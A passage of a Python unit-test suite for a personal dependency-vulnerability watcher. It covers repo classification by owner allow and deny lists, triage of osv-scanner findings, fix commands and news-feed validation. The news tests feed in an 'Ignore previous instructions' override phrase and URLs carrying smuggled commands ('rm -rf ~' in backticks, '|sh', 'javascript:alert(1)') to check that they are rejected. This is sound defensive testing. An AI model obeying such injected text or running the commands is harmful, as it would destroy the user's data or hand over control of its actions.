"""Unit tests for the deterministic parts of security_watch.py.

Run: python3 scripts/security-watch/test_security_watch.py
"""

import datetime as dt
import json
import os
import subprocess
import sys
import tempfile
import unittest
import unittest.mock
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import security_watch as sw  # noqa: E402

TODAY = dt.date(2026, 11, 21)
CFG = sw.parse_config("""
own_owners = ["magnusrodseth"]
exclude = ["magnusrodseth/old-thing"]
deny_owners = ["employer"]
[[allow]]
owner = "Aprende-AS"
[[allow]]
owner = "client"
until = "2026-12-01"
""")


class Classification(unittest.TestCase):
    def test_remote_parsing(self):
        self.assertEqual(sw.parse_remote("git@github.com:org/some-repo.git"), "org/some-repo")
        self.assertEqual(sw.parse_remote("https://github.com/magnusrodseth/dotfiles\n"), "magnusrodseth/dotfiles")
        self.assertEqual(sw.parse_remote("https://github.com/a/b.git/"), "a/b")

    def test_own_allowlisted_and_skipped(self):
        gh = lambda slug: [f"git@github.com:{slug}.git"]
        self.assertEqual(sw.classify_repo(gh("magnusrodseth/x"), CFG, TODAY)[:2], (True, "own"))
        self.assertEqual(sw.classify_repo(gh("Aprende-AS/EksamensportalenV2"), CFG, TODAY)[:2], (True, "allowlist"))
        self.assertFalse(sw.classify_repo(gh("capraconsulting/website"), CFG, TODAY)[0])
        self.assertEqual(sw.classify_repo(gh("magnusrodseth/old-thing"), CFG, TODAY)[:2], (False, "excluded"))
        self.assertEqual(sw.classify_repo([], CFG, TODAY)[:2], (True, "local (no remote)"))

    def test_exclude_is_case_insensitive(self):
        self.assertEqual(sw.classify_repo(["https://github.com/MagnusRodseth/Old-Thing"], CFG, TODAY)[:2], (False, "excluded"))

    def test_allowlist_expiry_is_exclusive(self):
        self.assertTrue(sw.classify_repo(["https://github.com/client/a"], CFG, dt.date(2026, 11, 30))[0])
        self.assertFalse(sw.classify_repo(["https://github.com/client/a"], CFG, dt.date(2026, 12, 1))[0])

    def test_deny_beats_everything(self):
        self.assertEqual(sw.classify_repo(["https://github.com/Employer/a"], CFG, TODAY), (False, "denied", None))
        cfg = sw.parse_config('own_owners = ["employer"]\ndeny_owners = ["employer"]\n')
        self.assertEqual(sw.classify_repo(["https://github.com/employer/a"], cfg, TODAY)[:2], (False, "denied"))
        with self.assertRaises(ValueError):
            sw.parse_config('deny_owners = ["employer"]\n[[allow]]\nowner = "Employer"\n')

    def test_deny_matches_every_url_shape_and_every_remote(self):
        for url in ["https://dev.azure.com/employer/Proj/_git/claims-core",
                    "git@ssh.dev.azure.com:v3/employer/Proj/repo",
                    "https://employer.visualstudio.com/Proj/_git/repo",
                    "https://gitlab.com/employer/team/repo.git",
                    "ssh://git@github.com/EMPLOYER/repo"]:
            self.assertEqual(sw.classify_repo([url], CFG, TODAY)[1], "denied", url)
        # an own origin does not rescue a repo with a denied second remote
        self.assertEqual(sw.classify_repo(["git@github.com:magnusrodseth/fork.git",
                                           "https://github.com/employer/fork.git"], CFG, TODAY)[1], "denied")

    def test_builtin_deny_holds_without_config(self):
        name = "denied-owner-for-test"
        old = set(sw.BUILTIN_DENY_SHA256)
        sw.BUILTIN_DENY_SHA256.add(__import__("hashlib").sha256(name.encode()).hexdigest())
        try:
            self.assertEqual(sw.classify_repo([f"https://github.com/{name}/x"], None, TODAY)[1], "denied")
            self.assertEqual(sw.classify_repo([f"https://github.com/{name.upper()}/x"], None, TODAY)[1], "denied")
        finally:
            sw.BUILTIN_DENY_SHA256.clear()
            sw.BUILTIN_DENY_SHA256.update(old)

    def test_without_allowlist_only_own_repos(self):
        self.assertTrue(sw.classify_repo(["https://github.com/magnusrodseth/x"], None, TODAY)[0])
        self.assertFalse(sw.classify_repo(["https://github.com/Aprende-AS/x"], None, TODAY)[0])

    def test_nested_denied_repo_is_never_read(self):
        """A denied clone inside an own repo must not reach osv-scanner, and
        skipped repos must not be named in what discovery returns."""
        with tempfile.TemporaryDirectory() as d:
            dev = Path(d, "dev")
            outer = dev / "personal" / "outer"
            inner = outer / "vendor-clone"
            other = dev / "personal" / "someone-else"
            for repo, url in ((outer, "git@github.com:magnusrodseth/outer.git"),
                              (inner, "https://github.com/employer/secret.git"),
                              (other, "https://github.com/stranger/thing.git")):
                repo.mkdir(parents=True)
                subprocess.run(["git", "init", "-q", str(repo)], check=True)
                subprocess.run(["git", "-C", str(repo), "remote", "add", "origin", url], check=True)
                (repo / "package-lock.json").write_text("{}")
            (outer / "app").mkdir()
            (outer / "app" / "pnpm-lock.yaml").write_text("")
            old = sw.DEV_DIR
            sw.DEV_DIR = dev
            try:
                included, skipped, roots = sw.discover_repos(CFG, TODAY)
            finally:
                sw.DEV_DIR = old
            self.assertEqual([r["slug"] for r in included], ["magnusrodseth/outer"])
            self.assertEqual(sorted(Path(p).relative_to(outer).as_posix() for p in included[0]["lockfiles"]),
                             ["app/pnpm-lock.yaml", "package-lock.json"])
            self.assertEqual(skipped, {"denied": 1, "not own, not on allowlist": 1})
            self.assertNotIn("employer", json.dumps([included, skipped]))
            self.assertNotIn("stranger", json.dumps([included, skipped]))

    def test_pushurl_and_git_errors_and_tracked_nested_dirs(self):
        with tempfile.TemporaryDirectory() as d:
            dev = Path(d, "dev")
            pushy, broken, outer = dev / "p" / "pushy", dev / "p" / "broken", dev / "p" / "outer"
            for repo in (pushy, broken, outer):
                repo.mkdir(parents=True)
                subprocess.run(["git", "init", "-q", str(repo)], check=True)
                (repo / "package-lock.json").write_text("{}")
            git = lambda r, *a: subprocess.run(["git", "-C", str(r), *a], check=True, capture_output=True)
            git(pushy, "remote", "add", "origin", "git@github.com:magnusrodseth/pushy.git")
            git(pushy, "config", "remote.origin.pushurl", "git@github.com:employer/pushy.git")
            (broken / ".git" / "config").write_text("[[[ not a git config")
            git(outer, "remote", "add", "origin", "git@github.com:magnusrodseth/outer.git")
            (outer / "vend").mkdir()
            (outer / "vend" / "package-lock.json").write_text("{}")
            git(outer, "add", "-A")
            subprocess.run(["git", "init", "-q", str(outer / "vend")], check=True)  # becomes its own repo later
            git(outer / "vend", "remote", "add", "origin", "https://github.com/employer/vend.git")
            old = sw.DEV_DIR
            sw.DEV_DIR = dev
            try:
                included, skipped, _ = sw.discover_repos(CFG, TODAY)
            finally:
                sw.DEV_DIR = old
            self.assertEqual([r["slug"] for r in included], ["magnusrodseth/outer"])
            self.assertEqual([Path(p).relative_to(outer).as_posix() for p in included[0]["lockfiles"]], ["package-lock.json"])
            self.assertEqual(skipped, {"denied": 2, "git error": 1})

    def test_config_types_are_checked(self):
        for bad in ['deny_owners = "employer"\n', 'own_owners = "magnusrodseth"\n', 'allow = ["x"]\n',
                    '[[allow]]\nowner = 3\n']:
            with self.assertRaises(ValueError, msg=bad):
                sw.parse_config(bad)

    def test_nested_repo_wins(self):
        roots = ["/d/outer", "/d/outer/inner"]
        self.assertEqual(sw.repo_for("/d/outer/inner/package-lock.json", roots), "/d/outer/inner")
        self.assertEqual(sw.repo_for("/d/outer/a/uv.lock", roots), "/d/outer")
        self.assertIsNone(sw.repo_for("/d/outerx/uv.lock", roots))


def vuln(vid, sev=None, fixed=(), name="lodash", aliases=()):
    return {"id": vid, "aliases": list(aliases), "summary": "s",
            "database_specific": {"severity": sev} if sev else {},
            "affected": [{"package": {"name": name, "ecosystem": "npm"},
                          "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}] + [{"fixed": f} for f in fixed]}]}]}


def osv_result(path, name, version, vulns, max_sev="9.8"):
    ids = [v["id"] for v in vulns]
    aliases = sorted({a for v in vulns for a in v["aliases"]} | set(ids))
    return {"source": {"path": path, "type": "lockfile"},
            "packages": [{"package": {"name": name, "version": version, "ecosystem": "npm"},
                          "vulnerabilities": vulns,
                          "groups": [{"ids": ids, "aliases": aliases, "max_severity": max_sev}] if vulns else []}]}


REPORT = {"run_at": "2026-11-21T08:00:00+00:00", "status": "findings", "first_run": False, "alarms": [],
          "findings": [], "news_matches": [], "news_name_only": [], "macos_updates": [], "weekly_digest": None,
          "stages": [], "config_source": "x", "db_age_hours": 1, "seconds": 1, "skipped_by_reason": {},
          "counts": {"repos_scanned": 1, "repos_skipped": 0, "lockfiles": 1, "packages": 1}}


class Findings(unittest.TestCase):
    def test_fixed_version_is_lowest_above_installed(self):
        v = [vuln("GHSA-1", "HIGH", fixed=("4.17.21", "3.10.0", "5.0.1"))]
        self.assertEqual(sw.pick_fixed(v, "npm", "lodash", "4.17.20"), "4.17.21")
        self.assertIsNone(sw.pick_fixed(v, "npm", "lodash", "6.0.0"))

    def test_prerelease_sorts_below_release(self):
        self.assertLess(sw.version_key("8.0.0-rc.6"), sw.version_key("8.0.0"))
        self.assertGreater(sw.version_key("8.0.0-rc.6"), sw.version_key("7.27.1"))

    def test_severity_falls_back_to_cvss(self):
        self.assertEqual(sw.group_severity([vuln("RUSTSEC-1")], "7.5"), "HIGH")
        self.assertEqual(sw.group_severity([vuln("GHSA-1", "MODERATE")], "9.9"), "MODERATE")

    def test_triage(self):
        osv = {"results": [
            osv_result("/r/a/package-lock.json", "lodash", "4.17.20", [vuln("GHSA-h", "HIGH", fixed=("4.17.21",), aliases=("CVE-1",))]),
            osv_result("/r/a/package-lock.json", "evil", "1.0.0", [vuln("MAL-2026-1", name="evil")], max_sev=""),
            osv_result("/r/a/package-lock.json", "nofix", "1.0.0", [vuln("GHSA-n", "CRITICAL", name="nofix")]),
            osv_result("/r/a/package-lock.json", "kevpkg", "1.0.0", [vuln("GHSA-k", "LOW", name="kevpkg", aliases=("CVE-9",))]),
        ]}
        recs, inv = sw.extract_findings(osv, {"/r/a/package-lock.json": "magnusrodseth/a"}, {}, "/x/machine.cdx.json", {"CVE-9"})
        tiers = {r["package"]: sw.triage(r) for r in recs}
        self.assertEqual(tiers, {"lodash": "finding", "evil": "alarm", "nofix": "weekly", "kevpkg": "alarm"})
        self.assertIn(("npm", "lodash"), inv)
        lodash = next(r for r in recs if r["package"] == "lodash")
        self.assertEqual(lodash["id"], "GHSA-h")
        self.assertEqual(lodash["scope"], "repo: magnusrodseth/a")
        self.assertIn("cd /r/a && npm update lodash", lodash["fix"])

    def test_unrequested_sources_are_dropped(self):
        osv = {"results": [osv_result("/r/a/nested/package-lock.json", "lodash", "1.0.0", [vuln("GHSA-h", "HIGH", fixed=("2",))])]}
        recs, inv = sw.extract_findings(osv, {"/r/a/package-lock.json": "a"}, {}, "/x/machine.cdx.json", set())
        self.assertEqual((recs, inv), ([], {}))

    def test_two_lockfiles_in_one_repo_keep_separate_keys(self):
        v = [vuln("GHSA-1", "HIGH", fixed=("4.17.21",))]
        osv = {"results": [osv_result("/r/mono/web/package-lock.json", "lodash", "4.17.20", v),
                           osv_result("/r/mono/api/package-lock.json", "lodash", "4.17.20", v)]}
        lf = {"/r/mono/web/package-lock.json": "m/mono", "/r/mono/api/package-lock.json": "m/mono"}
        recs, _ = sw.extract_findings(osv, lf, {}, "/x/machine.cdx.json", set())
        self.assertEqual(len({r["key"] for r in recs}), 2)
        md = sw.render_markdown({**REPORT, "findings": recs})
        self.assertIn("cd /r/mono/web &&", md)
        self.assertIn("cd /r/mono/api &&", md)

    def test_fixed_version_ignores_other_ecosystems(self):
        v = vuln("GHSA-x", "HIGH", fixed=("2.5.0",), name="foo")
        v["affected"].append({"package": {"name": "foo", "ecosystem": "PyPI"},
                              "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]})
        self.assertEqual(sw.pick_fixed([v], "npm", "foo", "2.0.0"), "2.5.0")

    def test_machine_sbom_maps_to_owner(self):
        osv = {"results": [osv_result("/x/machine.cdx.json", "lodash", "4.17.20", [vuln("GHSA-h", "HIGH", fixed=("4.17.21",))])]}
        origins = {("npm", "lodash", "4.17.20"): [{"kind": "npm-global", "top": "b-cli"}, {"kind": "npm-global", "top": "a-cli"}]}
        recs, _ = sw.extract_findings(osv, {}, origins, "/x/machine.cdx.json", set())
        self.assertEqual(len(recs), 1)  # one record, not one per top-level package
        self.assertEqual(recs[0]["scope"], "maskin: npm-global")
        self.assertEqual(recs[0]["fix"], "npm install -g a-cli@latest; npm install -g b-cli@latest")

    def test_report_groups_by_package(self):
        rec = lambda i, fixed: {"scope": "repo: a", "package": "axios", "version": "1.0.0", "id": i, "severity": "HIGH",
                                "malicious": False, "kev": [], "fixed": fixed, "fix": f"npm install axios@{fixed}"}
        md = sw.render_markdown({**REPORT, "findings": [rec("GHSA-1", "1.2.0"), rec("GHSA-2", "1.10.0")]})
        self.assertEqual(md.count("`axios@1.0.0`"), 1)
        self.assertIn("→ 1.10.0", md)  # the highest fix clears both advisories
        self.assertIn("npm install axios@1.10.0", md)

    def test_direct_dependency_command(self):
        with tempfile.TemporaryDirectory() as d:
            Path(d, "package.json").write_text(json.dumps({"devDependencies": {"vitest": "^1"}}))
            lf = str(Path(d, "pnpm-lock.yaml"))
            self.assertEqual(sw.fix_command(lf, "npm", "vitest", "1.6.1"), f"cd {d} && pnpm add -D vitest@1.6.1")
            self.assertIn("pnpm update -r undici", sw.fix_command(lf, "npm", "undici", "6.0.0"))
            Path(d, "pyproject.toml").write_text('[project]\ndependencies = ["Jinja2>=3"]\n')
            self.assertEqual(sw.fix_command(str(Path(d, "uv.lock")), "PyPI", "jinja2", "3.1.6"),
                             f"cd {d} && uv lock --upgrade-package jinja2==3.1.6")


def machine_rec(kind, name, version, vulns, tops=None):
    fixed = sw.pick_fixed(vulns, "npm", name, version)
    rec = {"scope": f"maskin: {kind}", "ecosystem": "npm", "package": name, "version": version,
           "id": vulns[0]["id"], "severity": "HIGH", "malicious": False, "kev": [], "fixed": fixed,
           "fix": "old command", "_affected": sw.package_affected(vulns, "npm", name)}
    if tops is not None:
        rec["tops"] = tops
    return rec


class Upstream(unittest.TestCase):
    def test_osv_ranges(self):
        aff = sw.package_affected([vuln("GHSA-1", fixed=("6.3.0",), name="p")], "npm", "p")
        self.assertTrue(sw.is_affected("6.1.0", aff))
        self.assertFalse(sw.is_affected("6.3.0", aff))
        two_lines = [{"ranges": [{"type": "SEMVER", "events": [
            {"introduced": "0"}, {"fixed": "6.3.0"}, {"introduced": "7.0.0"}, {"fixed": "8.4.0"}]}], "versions": []}]
        self.assertTrue(sw.is_affected("8.3.0", two_lines))
        self.assertFalse(sw.is_affected("6.3.0", two_lines))
        self.assertTrue(sw.is_affected("2.0.0", [{"ranges": [{"type": "SEMVER", "events": [
            {"introduced": "1.0.0"}, {"last_affected": "2.0.0"}]}], "versions": []}]))
        self.assertTrue(sw.is_affected("1.2.3", [{"ranges": [], "versions": ["1.2.3"]}]))

    def test_major_bump_and_selector(self):
        self.assertTrue(sw.major_bump("5.28.4", "6.29.1"))
        self.assertFalse(sw.major_bump("6.1.0", "6.3.0"))
        self.assertTrue(sw.major_bump("0.3.1", "0.4.0"))
        self.assertEqual(sw.override_selector("undici", "5.28.4"), "undici@5")
        self.assertEqual(sw.override_selector("x", "0.3.1"), "x@0.3")

    def test_npm_global_blocked_when_latest_still_pulls_it(self):
        rec = machine_rec("npm-global", "@azure/msal-node", "6.0.1",
                          [vuln("GHSA-m", fixed=("7.1.0",), name="@azure/msal-node")], tops=["toolkit"])
        sw.check_upstream([rec], resolve=lambda top: ("1.1.19", {"@azure/msal-node": {"6.0.1", "7.2.3"}}),
                          is_local=lambda top: False)
        self.assertEqual(rec["fix_status"], "blocked_upstream")
        self.assertTrue(rec["major_bump"])
        self.assertIn("toolkit@1.1.19 har fortsatt @azure/msal-node@6.0.1)", rec["fix"])
        self.assertIn("npm uninstall -g toolkit", rec["fix"])

    def test_npm_global_upgrade_when_latest_is_fixed_or_drops_it(self):
        v = [vuln("GHSA-1", fixed=("4.17.21",))]
        for tree in ({"lodash": {"4.17.21"}}, {}):
            rec = machine_rec("npm-global", "lodash", "4.17.20", v, tops=["cli"])
            sw.check_upstream([rec], resolve=lambda top: ("2.0.0", tree), is_local=lambda top: False)
            self.assertEqual(rec["fix_status"], "upgrade")
            self.assertEqual(rec["fix"], "old command")

    def test_pnpm_global_override_only_for_tops_that_pull_it(self):
        rec = machine_rec("pnpm-global", "undici", "5.28.4", [vuln("GHSA-u", fixed=("6.29.1",), name="undici")])
        trees = {"vercel": ("66.6.0", {"undici": {"5.28.4", "6.29.1"}}), "turbo": ("2.11.13", {})}
        sw.check_upstream([rec], resolve=lambda top: trees[top], pnpm_tops=lambda: (["turbo", "vercel"], 0))
        self.assertEqual(rec["fix_status"], "blocked_upstream")
        self.assertEqual([c["top"] for c in rec["upstream"]], ["vercel"])
        self.assertIn('"undici@5": "^6.29.1"', rec["fix"])
        self.assertIn("pnpm.overrides", rec["fix"])

    def test_resolve_failure_is_unknown_and_noted(self):
        rec = machine_rec("npm-global", "lodash", "4.17.20", [vuln("GHSA-1", fixed=("4.17.21",))], tops=["cli"])
        def boom(top):
            raise RuntimeError("offline")
        notes = sw.check_upstream([rec], resolve=boom, is_local=lambda top: False)
        self.assertEqual(rec["fix_status"], "unknown")
        self.assertEqual(rec["fix"], "old command")
        self.assertEqual(len(notes), 1)

    def test_repos_and_denied_tops_are_not_looked_up(self):
        repo = machine_rec("x", "lodash", "4.17.20", [vuln("GHSA-1", fixed=("4.17.21",))])
        repo["scope"] = "repo: magnusrodseth/a"
        denied = machine_rec("npm-global", "lodash", "4.17.20", [vuln("GHSA-1", fixed=("4.17.21",))],
                             tops=["@employer/cli"])
        looked = []
        notes = sw.check_upstream([repo, denied], resolve=lambda top: looked.append(top) or ("1", {}), cfg=CFG,
                                  is_local=lambda top: False)
        self.assertEqual(looked, [])
        self.assertEqual(notes, ["skipped a package from a denied owner"])  # counted, not named
        self.assertEqual(repo["fix_status"], "unchecked")
        self.assertEqual(denied["fix_status"], "unknown")

    def test_report_says_latest_does_not_help(self):
        rec = machine_rec("npm-global", "@azure/msal-node", "6.0.1",
                          [vuln("GHSA-m", fixed=("7.1.0",), name="@azure/msal-node")], tops=["toolkit"])
        sw.check_upstream([rec], resolve=lambda top: ("1.1.19", {"@azure/msal-node": {"6.0.1"}}),
                          is_local=lambda top: False)
        rec.pop("_affected")
        md = sw.render_markdown({**REPORT, "findings": [rec]})
        self.assertIn("**Nyeste versjon hjelper ikke:** `toolkit@1.1.19` drar fortsatt inn `@azure/msal-node@6.0.1`", md)
        self.assertIn("ny major, kan brekke", md)
        self.assertIn("npm uninstall -g toolkit", md)


    def test_pnpm_without_fixed_version_suggests_removal(self):
        rec = machine_rec("pnpm-global", "evil", "1.0.0", [vuln("MAL-2026-1", name="evil")])
        sw.check_upstream([rec], resolve=lambda top: ("2.0.0", {"evil": {"1.0.0"}}), pnpm_tops=lambda: (["cli"], 0))
        self.assertEqual(rec["fix_status"], "blocked_upstream")
        self.assertNotIn("None", rec["fix"])
        self.assertIn("pnpm remove -g cli", rec["fix"])

    def test_pnpm_override_covers_every_affected_line(self):
        v = [{"id": "GHSA-u", "aliases": [], "summary": "s", "database_specific": {"severity": "HIGH"},
              "affected": [{"package": {"name": "undici", "ecosystem": "npm"}, "ranges": [{"type": "SEMVER", "events": [
                  {"introduced": "0"}, {"fixed": "5.28.5"}, {"introduced": "6.0.0"}, {"fixed": "6.21.2"}]}]}]}]
        rec = machine_rec("pnpm-global", "undici", "5.28.4", v)
        sw.check_upstream([rec], resolve=lambda top: ("66", {"undici": {"5.28.4", "6.0.0"}}),
                          pnpm_tops=lambda: (["vercel"], 0))
        self.assertIn('"undici@5": "^5.28.5", "undici@6": "^6.21.2"', rec["fix"])

    def test_npm_global_keeps_upgrade_for_tops_that_are_fixed(self):
        rec = machine_rec("npm-global", "lodash", "4.17.20", [vuln("GHSA-1", fixed=("4.17.21",))], tops=["cli-a", "cli-b"])
        trees = {"cli-a": ("2", {"lodash": {"4.17.21"}}), "cli-b": ("1", {"lodash": {"4.17.20"}})}
        sw.check_upstream([rec], resolve=lambda top: trees[top], is_local=lambda top: False)
        self.assertTrue(rec["fix"].startswith("npm install -g cli-a@latest; ingen fiks oppstrøms (cli-b@1"))

    def test_local_tops_are_never_looked_up(self):
        looked = []
        resolve = lambda top: looked.append(top) or ("1", {})
        npm = machine_rec("npm-global", "lodash", "4.17.20", [vuln("GHSA-1", fixed=("4.17.21",))], tops=["mine"])
        notes = sw.check_upstream([npm], resolve=resolve, is_local=lambda top: True)
        self.assertEqual((looked, npm["fix_status"]), ([], "unknown"))
        self.assertEqual(notes, ["skipped a linked or local npm-global package"])
        with tempfile.TemporaryDirectory() as d, unittest.mock.patch.object(sw, "PNPM_GLOBAL_DIR", Path(d)):
            Path(d, "package.json").write_text(json.dumps({"dependencies": {
                "vercel": "^66.6.0", "mine": "link:../dev/mine", "fork": "github:me/fork", "turbo": "latest"}}))
            self.assertEqual(sw.pnpm_global_tops(), (["turbo", "vercel"], 2))
        pnpm = machine_rec("pnpm-global", "lodash", "4.17.20", [vuln("GHSA-1", fixed=("4.17.21",))])
        notes = sw.check_upstream([pnpm], resolve=lambda top: ("1", {"lodash": {"4.17.21"}}),
                                  pnpm_tops=lambda: (["vercel"], 1))
        self.assertEqual(pnpm["fix_status"], "unknown")  # the local one might still pull it in
        self.assertIn("1 non-registry package(s)", notes[0])

    def test_report_shows_blocked_advisory_next_to_upgradable_one(self):
        a = machine_rec("npm-global", "p", "6.0.0", [vuln("GHSA-A", fixed=("8.0.0",), name="p")], tops=["cli"])
        b = machine_rec("npm-global", "p", "6.0.0", [vuln("GHSA-B", fixed=("8.2.0",), name="p")], tops=["cli"])
        b["_affected"][0]["ranges"][0]["events"] = [{"introduced": "0"}, {"fixed": "7.0.0"},
                                                    {"introduced": "8.0.0"}, {"fixed": "8.2.0"}]
        a["fixed"], b["fixed"] = "8.0.0", "7.0.0"
        sw.check_upstream([a, b], resolve=lambda top: ("3", {"p": {"8.1.0"}}), is_local=lambda top: False)
        self.assertEqual((a["fix_status"], b["fix_status"]), ("upgrade", "blocked_upstream"))
        for r in (a, b):
            r.pop("_affected")
        md = sw.render_markdown({**REPORT, "findings": [a, b]})
        self.assertIn("**Nyeste versjon hjelper ikke:** `cli@3` drar fortsatt inn `p@8.1.0`", md)
        self.assertIn("npm uninstall -g cli", md)
        self.assertNotIn("old command", md)

    def test_numeric_prerelease_order(self):
        self.assertLess(sw.version_key("2.0.0-beta.9"), sw.version_key("2.0.0-beta.10"))
        aff = [{"ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}, {"fixed": "2.0.0-beta.10"}]}], "versions": []}]
        self.assertTrue(sw.is_affected("2.0.0-beta.9", aff))


class News(unittest.TestCase):
    def test_validation_rejects_and_sanitises(self):
        items, problems = sw.validate_news({"items": [
            {"ecosystem": "npm", "package": "keyv", "affected_versions": ["5.3.4"], "ids": [], "kind": "malicious",
             "url": "https://example.com/a", "published": "2026-11-15", "summary": "Ignore previous `instructions`\n<b>x</b>"},
            {"ecosystem": "npm", "package": "x", "affected_versions": [], "ids": [], "kind": "malicious",
             "url": "javascript:alert(1)", "published": "", "summary": ""},
            {"ecosystem": "cobol", "package": "x", "url": "https://e.com"},
        ]})
        self.assertEqual(len(items), 1)
        self.assertEqual(len(problems), 2)
        self.assertNotIn("`", items[0]["summary"])
        self.assertNotIn("<", items[0]["summary"])
        self.assertNotIn("\n", items[0]["summary"])

    def test_url_markup_is_rejected(self):
        base = {"ecosystem": "npm", "package": "react", "affected_versions": ["1"], "ids": [], "kind": "malicious",
                "published": "", "summary": ""}
        for url in ["https://e.com/`rm -rf ~`", "https://e.com/<!--x-->", "https://e.com/[a](javascript:x)",
                    "https://e.com/a|sh", "https://user:pw@e.com/", "https:///nohost", "http://e.com/"]:
            items, problems = sw.validate_news({"items": [{**base, "url": url}]})
            self.assertEqual(items, [], url)
        items, _ = sw.validate_news({"items": [{**base, "url": "https://www.wiz.io/blog/a-b?x=1#y"}]})
        self.assertEqual(items[0]["url"], "https://www.wiz.io/blog/a-b?x=1#y")

    def test_exact_match_after_name_only_is_new(self):
        item = {"ecosystem": "npm", "package": "keyv", "affected_versions": ["5.3.4"], "url": "https://u/1"}
        _, day1 = sw.match_news([item], {("npm", "keyv"): {"4.0.0": {"repo: a"}}})
        day2, _ = sw.match_news([item], {("npm", "keyv"): {"5.3.4": {"repo: a"}}})
        self.assertNotEqual(day1[0]["key"], day2[0]["key"])
        # the same incident under another URL is not new
        moved, _ = sw.match_news([{**item, "url": "https://u/2"}], {("npm", "keyv"): {"5.3.4": {"repo: a"}}})
        self.assertEqual(moved[0]["key"], day2[0]["key"])

    def test_missing_items(self):
        self.assertEqual(sw.validate_news(None)[0], [])

    def test_matching_is_exact_on_version(self):
        inv = {("npm", "keyv"): {"5.3.4": {"repo: a"}, "4.0.0": {"repo: b"}}, ("pypi", "foo-bar"): {"1.0": {"maskin: uv-tool"}}}
        items = [
            {"ecosystem": "npm", "package": "Keyv", "affected_versions": ["5.3.4"], "url": "https://u/1"},
            {"ecosystem": "npm", "package": "keyv", "affected_versions": ["9.9.9"], "url": "https://u/2"},
            {"ecosystem": "PyPI", "package": "Foo_Bar", "affected_versions": ["1.0"], "url": "https://u/3"},
            {"ecosystem": "npm", "package": "not-installed", "affected_versions": ["1"], "url": "https://u/4"},
        ]
        exact, name_only = sw.match_news(items, inv)
        self.assertEqual([e["url"] for e in exact], ["https://u/1", "https://u/3"])
        self.assertEqual(exact[0]["installed"], [{"version": "5.3.4", "scopes": ["repo: a"]}])
        self.assertEqual([n["url"] for n in name_only], ["https://u/2"])


class Machine(unittest.TestCase):
    def test_spec_splitting(self):
        self.assertEqual(sw.split_spec("npx", "@playwright/mcp@latest"), ("npm", "@playwright/mcp", None))
        self.assertEqual(sw.split_spec("npx", "@scope/pkg@1.2.3"), ("npm", "@scope/pkg", "1.2.3"))
        self.assertEqual(sw.split_spec("npx", "plain"), ("npm", "plain", None))
        self.assertEqual(sw.split_spec("uvx", "nanobanana-mcp-server@latest"), ("PyPI", "nanobanana-mcp-server", None))
        self.assertEqual(sw.split_spec("uvx", "tool==0.3.1"), ("PyPI", "tool", "0.3.1"))

    def test_purl(self):
        self.assertEqual(sw.purl("npm", "@a/b", "1.0.0"), "pkg:npm/%40a/b@1.0.0")
        self.assertEqual(sw.purl("PyPI", "Foo_Bar", "1"), "pkg:pypi/foo-bar@1")

    def test_mcp_skips_denied_projects_scopes_and_urls(self):
        with tempfile.TemporaryDirectory() as d:
            home = Path(d)
            dev = home / "dev"
            cj = {"mcpServers": {"pw": {"command": "npx", "args": ["-y", "@playwright/mcp@latest"]},
                                 "emp": {"command": "npx", "args": ["@employer/internal-mcp"]},
                                 "git": {"command": "uvx", "args": ["--from", "git+https://github.com/x/y", "y"]},
                                 "bad": "oops"},
                  "projects": {str(dev / "work" / "denied"): {"mcpServers": {"w": {"command": "npx", "args": ["secret-mcp"]}}},
                               str(dev / "personal" / "own"): {"mcpServers": {"o": {"command": "uvx", "args": ["own-mcp==1.0"]}}}}}
            (home / ".claude.json").write_text(json.dumps(cj))
            roots = {str(dev / "work" / "denied"): False, str(dev / "personal" / "own"): True}
            old = (sw.HOME, sw.DEV_DIR)
            sw.HOME, sw.DEV_DIR = home, dev
            try:
                notes = []
                specs = sw.mcp_specs(roots, notes)
            finally:
                sw.HOME, sw.DEV_DIR = old
            names = [s[2] for s in specs]
            self.assertIn("@playwright/mcp@latest", names)
            self.assertIn("own-mcp==1.0", names)
            self.assertNotIn("secret-mcp", names)
            self.assertFalse(any("git+" in n for n in names))
            self.assertTrue(any("not a registry package" in n for n in notes))
            # scoped package of a denied owner is filtered before any lookup
            self.assertTrue(sw.is_denied(sw.remote_tokens("employer/internal-mcp"), CFG))

    def test_malformed_claude_json_is_a_note(self):
        with tempfile.TemporaryDirectory() as d:
            Path(d, ".claude.json").write_text("{truncated")
            old = sw.HOME
            sw.HOME = Path(d)
            try:
                notes = []
                self.assertEqual(sw.mcp_specs({}, notes), [])
            finally:
                sw.HOME = old
            self.assertTrue(notes)

    def test_guarded_stage_failure_does_not_stop_the_run(self):
        ctx = sw.Ctx(run_dir=Path("/nonexistent"), today=TODAY, weekly=False)
        def boom(s):
            raise subprocess.TimeoutExpired(["brew"], 1)
        self.assertEqual(ctx.guarded("weekly", boom, "fallback"), "fallback")
        self.assertEqual(ctx.guarded("next", lambda s: 42), 42)
        self.assertEqual([(x.name, x.status) for x in ctx.stages], [("weekly", "failed"), ("next", "ok")])

    def test_invalid_allowlist_never_replaces_the_cache(self):
        with tempfile.TemporaryDirectory() as d:
            state, bin_dir = Path(d, "state"), Path(d, "bin")
            state.mkdir(); bin_dir.mkdir()
            good = 'own_owners = ["magnusrodseth"]\n[[allow]]\nowner = "Aprende-AS"\n'
            (state / "config-cache.toml").write_text(good)
            op = bin_dir / "op"
            op.write_text("#!/bin/sh\necho 'this is = = not toml'\n")
            op.chmod(0o755)
            old_state, old_path = sw.STATE_DIR, os.environ["PATH"]
            sw.STATE_DIR = state
            os.environ["PATH"] = f"{bin_dir}:{old_path}"
            os.environ.pop("SECURITY_WATCH_CONFIG", None)
            try:
                stage = sw.Stage("config")
                cfg, source = sw.load_config(stage)
            finally:
                sw.STATE_DIR, os.environ["PATH"] = old_state, old_path
            self.assertEqual((state / "config-cache.toml").read_text(), good)
            self.assertEqual(cfg["allow"], [{"owner": "Aprende-AS"}])
            self.assertEqual(stage.status, "degraded")
            self.assertIn("invalid", stage.detail)

    def test_package_spec_skips_option_values(self):
        self.assertEqual(sw.package_spec(["--python", "3.12", "tool-mcp"]), "tool-mcp")
        self.assertEqual(sw.package_spec(["--from=git+https://x/y", "y"]), "git+https://x/y")
        self.assertEqual(sw.package_spec(["-y", "--registry", "https://r", "@a/b@1.0.0"]), "@a/b@1.0.0")

    def test_stage_detail_is_flattened_in_the_report(self):
        md = sw.render_markdown({**REPORT, "stages": [{"name": "news", "status": "failed",
